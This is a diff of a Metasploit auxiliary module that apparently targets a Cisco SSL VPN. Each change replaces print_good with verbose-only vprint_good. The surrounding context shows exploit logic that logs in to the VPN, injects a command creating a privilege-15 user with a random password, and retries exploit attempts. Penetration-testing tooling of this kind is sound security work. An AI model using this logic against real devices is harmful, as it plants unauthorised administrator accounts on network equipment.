@@ -56,7 +56,7 @@ class Metasploit3 < Msf::Auxiliary
               'method' => 'GET'
             )
 
-      print_good "#{peer} - Server is responsive"
+      vprint_good "#{peer} - Server is responsive"
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
       return false
     end
@@ -94,7 +94,7 @@ class Metasploit3 < Msf::Auxiliary
 
     if res &&
        res.code == 200
-      print_good "#{peer} - Logged out"
+      vprint_good "#{peer} - Logged out"
     end
   end
 
@@ -125,7 +125,7 @@ class Metasploit3 < Msf::Auxiliary
         return resp.body
       else
         vprint_error "#{peer} - Unable to run '#{command}'"
-        print_good "#{peer} - Retrying #{i} '#{command}'" unless i == 2
+        vprint_good "#{peer} - Retrying #{i} '#{command}'" unless i == 2
       end
     end
 
@@ -137,18 +137,18 @@ class Metasploit3 < Msf::Auxiliary
     password = random_password
 
     tries.times do |i|
-      print_good "#{peer} - Attemping to add User: #{username}, Pass: #{password}"
+      vprint_good "#{peer} - Attemping to add User: #{username}, Pass: #{password}"
       command = "username #{username} password #{password} privilege 15"
       resp = run_command(command, cookie)
 
       if resp &&
          !resp.body.include?('Command authorization failed') &&
          !resp.body.include?('Command failed')
-        print_good "#{peer} - Privilege Escalation Appeared Successful"
+        vprint_good "#{peer} - Privilege Escalation Appeared Successful"
         return [username, password]
       else
         vprint_error "#{peer} - Unable to run '#{command}'"
-        print_good "#{peer} - Retrying #{i} '#{command}'" unless i == tries - 1
+        vprint_good "#{peer} - Retrying #{i} '#{command}'" unless i == tries - 1
       end
     end
 
@@ -200,7 +200,7 @@ class Metasploit3 < Msf::Auxiliary
          resp.body.include?('SSL VPN Service') &&
          resp.body.include?('webvpn_logout')
 
-        print_good "#{peer} - Logged in with User: #{datastore['USERNAME']}, Pass: #{datastore['PASSWORD']} and Group: #{datastore['GROUP']}"
+        vprint_good "#{peer} - Logged in with User: #{datastore['USERNAME']}, Pass: #{datastore['PASSWORD']} and Group: #{datastore['GROUP']}"
         return resp.get_cookies
       else
         return false
@@ -222,7 +222,7 @@ class Metasploit3 < Msf::Auxiliary
     # interimittent based on session, so we'll just retry
     # 'X' times.
     datastore['RETRIES'].times do |i|
-      print_good "#{peer} - Exploit Attempt ##{i}"
+      vprint_good "#{peer} - Exploit Attempt ##{i}"
 
       # Authenticate to SSL VPN and get session cookie
       cookie = do_login(
